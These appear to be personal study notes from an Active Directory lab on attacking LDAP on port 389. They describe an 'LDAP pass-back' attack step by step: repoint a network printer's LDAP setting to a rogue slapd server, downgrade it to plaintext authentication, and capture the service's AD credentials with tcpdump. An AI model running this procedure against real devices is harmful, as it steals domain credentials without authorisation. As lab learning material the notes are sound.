**Port 389**

Lightweight Directory Access Protocol: similar to NTLM but the app directly verifies user creds. Popular with 3rd party apps that integrate with AD.
Gitlab, Jenkins, Custom-apps, printers, VPNs
If any public-facing, then NTLM style attacks will also work on them. LDAP services require their own set of AD credentials, adding another attack avenue. 
- We can recover the AD credentials used by the service to authenticate ![[Pasted image 20230303175109.png]]
- Gaining a foothold on the service then allows us to look at plaintext config files which often hold AD credentials
### LDAP Pass-back Attacks
If we have access to a device's config where LDAP parameters are specified, we can edit it to resolve our IP as LDAP server, passing ourselves as the authenticator and having the service send its LDAP credentials to us. This is useful because these configs are often stored in insecure places like the web interface of a network printer, while the LDAP credential file is more safely guarded. 

Example.
A network printer has an internet facing webpage for its own settings. 
1. Navigate to webpage, see cred input section and a connection IP section, its prefilled but the password is hidden.
2. Set the IP to local, apply settings, and try netcat on LDAP port 389 to catch an incoming packet. The connection breaks since LDAP requires some initialization
3. Host a rogue LDAP server instead, and downgrade it to allow plaintext authentication (kill any existing LDAP [[service]])
	1. `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd` , to download, install, and enable `slapd` (may have to be done outside of the VPN)
	2. `sudo dpkg-reconfigure -p low slapd` , to enter config
	3. run through config options (DC name -> ... -> any password -> MBD -> No to purge -> Yes to move)
	4. create downgrade config file: `olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred`
	5. `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart` to patch the server with our file
	6. `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms` to verify that the mechanisms are "PLAIN" and "LOGIN"
4. Press Test Settings again to get it to connect and `sudo tcpdump -SX -i breachad tcp port 389`  to review the traffic [[tcpdump]]
5. Scroll through and find the authentication request and plaintext password